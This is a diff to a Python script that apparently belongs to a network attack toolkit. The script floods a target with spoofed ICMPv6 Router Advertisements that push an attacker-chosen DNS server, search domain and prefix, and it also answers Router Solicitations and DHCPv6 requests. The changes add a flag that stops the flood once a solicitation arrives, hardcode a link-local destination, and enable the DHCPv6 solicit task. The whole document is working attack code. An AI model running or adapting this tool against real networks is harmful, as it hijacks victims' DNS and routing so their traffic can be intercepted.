@@ -17,6 +17,7 @@ target_ip_address = None
 recursive_dns_address = None
 
 need_neighbor_advertise = False
+need_router_advertise = True
 dhcpv6_request_in_your_server = False
 icmpv6_neighbor_solicit_your_ip = False
 already_print_success_message = False
@@ -144,11 +145,11 @@ def send_icmpv6_advertise_packets():
         icmpv6_ra_packet = icmpv6.make_router_advertisement_packet(ethernet_src_mac=your_mac_address,
                                                                    ethernet_dst_mac=target_mac_address,
                                                                    ipv6_src=your_ipv6_link_address,
-                                                                   ipv6_dst=Base.create_ipv6_link_address(target_mac_address),
+                                                                   ipv6_dst="fe80::8e85:90ff:fe26:2be",
                                                                    dns_address=recursive_dns_address,
                                                                    domain_search=dns_search,
                                                                    prefix=network_prefix)
-        while True:
+        while need_router_advertise:
             SOCK.send(icmpv6_ra_packet)
             sleep(0.1)
 
@@ -157,6 +158,7 @@ def reply(request):
     global global_socket
     global ipv6_address
     global need_neighbor_advertise
+    global need_router_advertise
     global icmpv6_neighbor_solicit_your_ip
     global dhcpv6_request_in_your_server
     global already_print_success_message
@@ -165,6 +167,7 @@ def reply(request):
     if request.haslayer(ICMPv6ND_RS):
         print Base.c_info + "Sniff ICMPv6 Router Solicitation request from: " + request[IPv6].src + " (" + \
               request[Ether].src + ")"
+        need_router_advertise = False
         icmpv6_ra_packet = icmpv6.make_router_advertisement_packet(ethernet_src_mac=your_mac_address,
                                                                    ethernet_dst_mac=request[Ether].src,
                                                                    ipv6_src=your_ipv6_link_address,
@@ -274,7 +277,7 @@ def reply(request):
 if __name__ == "__main__":
     tm.add_task(send_icmpv6_solicit_packets)
     tm.add_task(send_icmpv6_advertise_packets)
-    # tm.add_task(send_dhcpv6_solicit_packets)
+    tm.add_task(send_dhcpv6_solicit_packets)
 
     if args.target_ip is not None:
         if args.target_mac is None:
